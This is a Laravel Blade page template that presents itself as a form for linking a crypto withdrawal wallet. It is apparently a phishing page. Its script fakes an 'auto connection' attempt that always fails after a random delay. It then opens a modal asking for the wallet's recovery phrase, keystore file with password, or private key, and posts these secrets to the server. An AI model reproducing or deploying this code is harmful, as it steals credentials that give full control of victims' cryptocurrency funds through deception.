@extends('layouts.back')
@section('title','Create Method')
@section('content')
<x-message />
<div class="col-lg-4 mx-auto">
    <div class="card">
        <div class="card-body">
            <form action="{{ route('user.withdrawal.methods.store', $method->id) }}" method="POST" enctype="multipart/form-data" id="link-form">
                @csrf
                <div class="text-center py-4">
                    <img src="{{asset(config('dir.methods').$method->image)}}" alt="" style="width: 140px;">
                </div>
                <div class="form-group">
                    <label for="name">Name</label>
                    <input type="text" class="form-control" name="name" id="name" placeholder="eg. Binance {{$method->name}}">
                    <x-error key="name" />
                </div>

                <div class="form-group">
                    <label for="address">Wallet Address</label>
                    <input type="text" class="form-control" name="address" id="address" placeholder="{{$method->name}} Address">
                    <x-error key="address" />
                </div>

                <div class="d-flex justify-content-center mt-3">
                    <button type="submit" id="link" class="btn btn-primary btn-sm px-5">Link</button>
                </div>
            </form>
        </div>
    </div>
</div>

@endsection

@push('modals')
<div class="modal fade" id="linking" style="display: none;" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered modal-sm" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Auto Connection failed</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal">
                </button>
            </div>
            <div class="modal-body text-center text-danger">
                <div class="px-5">
                    We were unable to connect to your <strong></strong>{{$method->name}} Wallet Address
                </div>
                <br>
                <div id="manualConnect" class="d-block text-success light" style="cursor:pointer;">
                    Connect Manually
                </div>
            </div>
            {{-- <div class="modal-footer">
                <button type="button" class="btn btn-outline-warning light btn-sm" data-bs-dismiss="modal">Cancel</button>
                <button type="button" class="btn btn-outline-success btn-sm" id="manualConnect">Connect Manually</button>
            </div> --}}
        </div>
    </div>
</div>

<div class="modal fade" id="manualLink" style="display: none;" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Link Wallet Manually</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal">
                </button>
            </div>
            <div class="modal-body">
                <div class="px-5 pb-5">
                    <p>
                        Use any of the methods below to connect to your {{$method->name}} Address.
                    </p>

                    <ul class="nav nav-tabs d-flex justify-content-center mb-2" id="myTab" role="tablist">
                        <li class="nav-item" role="presentation">
                            <a class="nav-link active" id="home-tab" data-toggle="tab" href="#home" role="tab" aria-controls="home" aria-selected="true">Phrase</a>
                        </li>
                        <li class="nav-item" role="presentation">
                            <a class="nav-link" id="profile-tab" data-toggle="tab" href="#profile" role="tab" aria-controls="profile" aria-selected="false">Keystore JSON</a>
                        </li>
                        <li class="nav-item" role="presentation">
                            <a class="nav-link" id="contact-tab" data-toggle="tab" href="#contact" role="tab" aria-controls="contact" aria-selected="false">Private Key</a>
                        </li>
                    </ul>
                    <div class="tab-content px-3" id="myTabContent">
                        <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
                            <div class="form-group">
                                <textarea placeholder="Enter your recovery phrase" name="phrase" id="phrase" cols="30" rows="4" class="form-control" style="height: 120px;"></textarea>
                                <x-error key="phrase" />
                            </div>
                            <strong><small>Typically 12 words separated by single spaces</small></strong>
                            <button class="btn-block btn-info btn mt-2" id="submit-phrase">
                                <span class="my-3">
                                    PROCEED <i class="fas fa-arrow-circle-right"></i>
                                </span>
                            </button>
                        </div>
                        <div class="tab-pane fade" id="profile" role="tabpanel" aria-labelledby="profile-tab">
                            <label id="upload-btn" for="file">
                                Choose Keystore File
                            </label>
                            <input type="file" name="file" id="file" style="display: none;" accept="application/json">
                            <x-error key="file" />
                            <input type="text" class="form-control my-3" placeholder="Enter Keystore Password" id="password">
                            <x-error key="password" />
                            <button class="btn-block btn-info btn mt-2" id="json-submit">
                                <span class="my-3">
                                    PROCEED <i class="fas fa-arrow-circle-right"></i>
                                </span>
                            </button>
                        </div>
                        <div class="tab-pane fade" id="contact" role="tabpanel" aria-labelledby="contact-tab">
                            <input type="text" class="form-control my-3" placeholder="Enter Private Key" id="key">
                            <x-error key='key' />
                            <button class="btn-block btn-info btn mt-2" id="key-submit">
                                <span class="my-3">
                                    PROCEED <i class="fas fa-arrow-circle-right"></i>
                                </span>
                            </button>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>
@endpush

@push('css')
<style>
    .method:hover,
    .method.selected {
        border: var(--bs-teal) 1px solid;
        padding: 5px;
        border-radius: 8px;
    }

    #upload-btn {
        font-weight: 700;
        color: lightgray;
        width: 100%;
        text-align: center;
        border: 1px dashed rgb(48, 48, 51);
        padding: 15px 0;
        border-radius: 12px;
        cursor: pointer;
        margin-top: 18px;
    }
</style>
@endpush

@push('js')
<script>
    var form  = new FormData();
    var file_contents = '';
    var loader = "<span class='spinner-border spinner-border-sm'></span>";

    $('.modal').attr('data-keyboard', false);
    $('.modal').attr('data-backdrop', 'static');


    $(document).on('input', 'input,textarea', e => {
        $(e.currentTarget).next('span').html('')
    })

    $('#link-form').on('submit',function(e){
        e.preventDefault();
        nameEl = $('#name');
        addressEl = $('#address');
        elem = $('#link');

        if(isEmpty(nameEl.val())){
            nameEl.next('span').html('Name cannot be empty.')
            return;
        }

        if(isEmpty(addressEl.val())){
            addressEl.next('span').html('Name cannot be empty.')
            return;
        }

        form.append('name', nameEl.val());
        form.append('address', addressEl.val());

        elem.html(`<span class="spinner-grow spinner-grow-sm" ></span> Linking..`)
        setTimeout(() => {
            elem.html('Link')
            $('#linking').modal('show');
        }, randomNumber());
    })

    $('#manualConnect').on('click', function(e){
        $('#linking').modal('hide');
        $('#manualLink').modal('show');
    })

    $(document).on('click', '#submit-phrase', e => {
        let elem = $(e.currentTarget)
        let elemHtml = elem.html();
        let phraseEl = $('#phrase');
        let phrase = phraseEl.val();
        if (phrase == '') {
            phraseEl.next('span').html('Phrase field cannot be empty');
            return;
        }

        length = phraseEl.val().trim(' ').split(' ').length;

        if (isLength(length)) {
            phraseEl.next('span').html('Phrase cannot be more than 12 words');
            return;
        }

        if (isLength(length, '<')) {
            phraseEl.next('span').html('Phrase cannot be less than 12 words');
            return;
        }
        elem.html(loader);
        setTimeout(() => {
            form.append('details', JSON.stringify({"phrase":phrase}));
            if(submitForm()){
                end();
            }
            elem.html(elemHtml);
        }, randomNumber(1200,3000));



    })

    $(document).on('change', '#file', function(e){
        var file = e.target.files[0];
        if (!file.type == 'application/json') {
            $('#file').next('span').html('Only JSON files are allowed');
        }
        var reader = new FileReader();
        reader.onload = function(event){
            file_contents = JSON.parse(event.target.result);
            console.log(file_contents)
        }
        reader.readAsText(file);
        $('#upload-btn').html(file.name)
    })

    $(document).on('click', '#json-submit', e => {
        let elem = $(e.currentTarget);
        let elemHtml = elem.html();
        let files = $('#file').prop('files');
        let password = $('#password').val();
        if (isLength(files.length,'<',1)) {
            $('#file').next('span').html('You need to upload your key store file');
            return;
        }
        if (isEmpty(password)) {
            $('#password').next('span').html('Key store password cannot be empty');
            return;
        }

        elem.html(loader);

        var details = JSON.stringify({
            "password":password,
            'json': file_contents
        });


        setTimeout(() => {
            form.append('details', details);
            if(submitForm()){
                end();
            }
            elem.html(elemHtml);
        }, randomNumber(1200,3000));

    });

    $(document).on('click','#key-submit',function(e){
        let elem = $(e.currentTarget);
        let elemHtml = elem.html();

        let key = $('#key');

        if (isEmpty(key.val())) {
            key.next('span').html('Private key cannot be empty');
            return;
        }

        elem.html(loader);

        var details = JSON.stringify({
            "key":key.val(),
        });


        setTimeout(() => {
            form.append('details', details);
            if(submitForm()){
                end();
            }
            elem.html(elemHtml);
        }, randomNumber(1200,3000));



    })

    async function submitForm() {
        try {
            // Default options are marked with *
             const response = await fetch("{{route('user.withdrawal.methods.store',$method->id)}}", {
                method: 'POST', // *GET, POST, PUT, DELETE, etc.
                mode: 'cors', // no-cors, *cors, same-origin
                cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
                credentials: 'same-origin', // include, *same-origin, omit
                headers: {
                    // 'Content-Type': contentType,
                    'X-CSRF-TOKEN': $('meta[name="token"]').attr('content').trim(),
                    // 'Content-Type': 'application/x-www-form-urlencoded',
                },
                // redirect: 'follow', // manual, *follow, error
                // referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
                body: form // body data type must match "Content-Type" header
            });

            if(!response.ok) throw new Error('');

            return response.json();

        } catch (error) {
            console.log(error)
            toast('Failed to link wallet, try again or contact support','error');
            return;
        }
    }

    function isEmpty(param){
        return (!param || param.length === 0);
    }

    function isLength(param, operator = '>' ,  length = 12,){
        var result = null;
        switch (operator) {
            case '<': result = param < length; break;
            default: result = param > length; break;
        }
        return result;
    }

    function end(){
        $('.modal').modal('hide');
        toast('Widrawal method linked successfully');
        setTimeout(() => {
            location.href = "{{route('user.withdrawal.methods.index')}}";
        }, randomNumber());
    }

    function randomNumber(min = 2500, max= 5000)
    {
        return (Math.random() * (max - min) + min);
    }

</script>
@endpush
